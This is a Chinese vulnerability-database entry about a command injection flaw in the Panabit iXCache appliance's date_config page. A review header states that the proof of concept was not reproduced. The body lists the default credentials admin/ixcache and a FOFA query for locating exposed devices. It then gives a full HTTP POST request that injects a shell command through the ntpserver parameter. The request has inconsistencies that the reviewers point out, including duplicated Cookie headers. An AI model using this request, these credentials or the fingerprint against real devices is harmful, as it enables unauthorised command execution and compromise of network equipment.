---
source: "wy876 漏洞文库"
id: "vw-383317a8817c4e5d1c5257df"
entity_id: "ve-383317a8817c4e5d1c5257df"
schema_version: "1"
fofa_unverified: "<font style="
title: "Panabit iXCache date_config存在后台命令执行漏洞"
product: "Panabit iXCache"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "admin默认账户登录；声称每次请求重新取cookie；无版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Panabit/PanabitiXCachedate_config%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pm3gifvcepzx9xkc"
source_status: "recorded"
---

# Panabit iXCache date_config存在后台命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit iXCache
- 本文讨论：date_config ntpserver配置注入
- 版本、权限与配置前提：admin默认账户登录；声称每次请求重新取cookie；无版本
- 资料类型：后台请求PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 两个Cookie头互相混用，并把响应Path属性放入请求Cookie
- fofa元数据被font污染；缺221详述的source配置执行点和读回步骤
- 每次重取cookie说法无机制说明
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复

### 待核与来源

- 会话轮换条件、版本和修复待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
panabit缓存加速产品是一款基于派网公司自研的操作系统（PanaOS）上研发的内容缓存产品。iXCache依靠高稳定性、高可靠性两大特点，可缓存丰富的资源，目前支持Web视频、移动视频、Web音乐、移动音乐、软件下载、应用商店、游戏补丁等八大类资源的缓存。部署灵活、支持交换机镜像和Panabit牵引两种模式，满足不同级别的用户需求。panabit iXCache系统date_config存在命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ Panabit iXCache

# 三、资产测绘
+ fofa`<font style="color:rgb(255, 0, 0);">title="iXCache"</font>`
+ 特征


# 四、漏洞复习
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie


2. 使用上一步获取的cookie，执行命令（每次发包需要在登录处重新获取一次cookie）

```http
POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: 
Cookie: pauser_1626709857_644740=paonline_admin_48217_16289319551;Path=/;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Cookie: pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

ntpserver=0.0.0.0;ls&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pm3gifvcepzx9xkc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
